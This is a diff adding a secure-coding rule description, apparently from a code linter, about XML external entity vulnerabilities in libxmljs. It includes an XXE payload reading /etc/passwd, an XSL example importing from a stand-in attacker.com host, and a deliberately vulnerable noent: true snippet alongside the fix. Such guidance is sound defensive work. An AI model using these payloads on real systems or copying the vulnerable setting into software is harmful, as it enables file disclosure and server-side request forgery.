@@ -1,0 +1,59 @@
+<p><a href="https://www.w3.org/TR/xml/">XML specification</a> allows the use of entities that can be <a
+href="https://www.w3.org/TR/xml/#sec-internal-ent">internal</a> or <a href="https://www.w3.org/TR/xml/#sec-external-ent">external</a> (file system /
+network access ...) which could lead to vulnerabilities such as confidential file disclosures or <a
+href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRFs</a>.</p>
+<p>Example in this XML document, an external entity read the /etc/passwd file:</p>
+<pre>
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+  &lt;!DOCTYPE test [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+  ]&gt;
+&lt;note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
+  &lt;to&gt;&amp;xxe;&lt;/to&gt;
+  &lt;from&gt;Jani&lt;/from&gt;
+  &lt;heading&gt;Reminder&lt;/heading&gt;
+  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
+&lt;/note&gt;
+</pre>
+<p>In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:</p>
+<pre>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.attacker.com/evil.xsl"&gt;
+  &lt;xsl:import href="http://www.attacker.com/evil.xsl"/&gt;
+  &lt;xsl:include href="http://www.attacker.com/evil.xsl"/&gt;
+ &lt;xsl:template match="/"&gt;
+  &amp;content;
+ &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</pre>
+<p>It is recommended to disable access to external entities and network access in general.</p>
+<h2>Noncompliant Code Example</h2>
+<p><a href="https://github.com/libxmljs/libxmljs">libxmljs</a> module:</p>
+<pre>
+const libxmljs = require("libxmljs");
+var fs = require('fs');
+
+var xml = fs.readFileSync('xxe.xml', 'utf8');
+
+var xmlDoc = libxmljs.parseXmlString(xml, { noblanks: true, noent: true, nocdata: true }); // Noncompliant: noent set to true
+</pre>
+<h2>Compliant Solution</h2>
+<p><a href="https://github.com/libxmljs/libxmljs">libxmljs</a> module:</p>
+<pre>
+const libxmljs = require("libxmljs");
+var fs = require('fs');
+
+var xml = fs.readFileSync('xxe.xml', 'utf8');
+
+var xmlDoc = libxmljs.parseXmlString(xml); // Compliant: noent set to false by default
+</pre>
+<h2>See</h2>
+<ul>
+  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)">OWASP Top 10 2017 Category A4</a> - XML External Entities
+  (XXE) </li>
+  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XXE Prevention Cheat Sheet</a>
+  </li>
+  <li> <a href="http://cwe.mitre.org/data/definitions/611.html">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li>
+  <li> <a href="http://cwe.mitre.org/data/definitions/827.html">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li>
+</ul>
+
